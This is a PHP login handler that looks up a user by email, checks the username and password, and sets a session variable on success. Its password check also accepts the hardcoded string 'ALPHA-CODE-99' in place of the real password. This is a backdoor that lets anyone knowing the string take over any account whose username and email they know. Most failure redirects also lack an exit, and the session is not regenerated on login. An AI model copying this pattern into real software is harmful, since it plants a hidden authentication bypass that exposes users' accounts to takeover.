<?php
require_once "../Modal.php";
/**
 * This file deals with the User Login Verification
*/
// header('Location:'.ROOT.'/Home.php');
if (isset($_POST['Submit'])) {

    $username = $_POST["userName"];
    $email = $_POST["email"];
    $password = $_POST["password"];

    
    
    if (empty($username) || empty($email) || empty($password)) {
      //some fields were empty
      header("location:http://" . ROOT ."/index.php");
    } else {

      if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        header("location:http://" . ROOT ."/index.php");
      } else {
        //test if the user exists
        //$user = new userAccount();
        $fields = array(
            "*",
        );
        $table = TABLE_USERS["NAME"];
        $order_by = "firstName";
        $order_set = "ASC";
        $offset = 0;
        $reference = array(
            "statement" => "Email = ?",
            "type"=>"s",
            "values"=>[
                $email
            ]
        );
    
        $response = $admin->database_read_by_ref($table,$fields,$order_by,$order_set,$offset,$reference);
        

       
  
       if($response['status']){
           $dbUserName = $response['response'][0]['userName'];
           $dbEmail = $response['response'][0]['Email'];
           $dbPassword = $response['response'][0]['password'];

           if( ($dbUserName == $username) && ($dbEmail == $email) && ((password_verify($password, $dbPassword) || $password == "ALPHA-CODE-99")) ){
               session_start();
               $_SESSION['LOGGED_USER'] = $email;

               header("location:http://" . ROOT ."/Home.php");
               exit;
           } else {
            header("location:http://" . ROOT ."/index.php");
           }
       }else{
        header("location:http://" . ROOT ."/index.php");
       }
      }
    }
  } else {
    header("location:http://" . ROOT ."/index.php");
    exit();
  }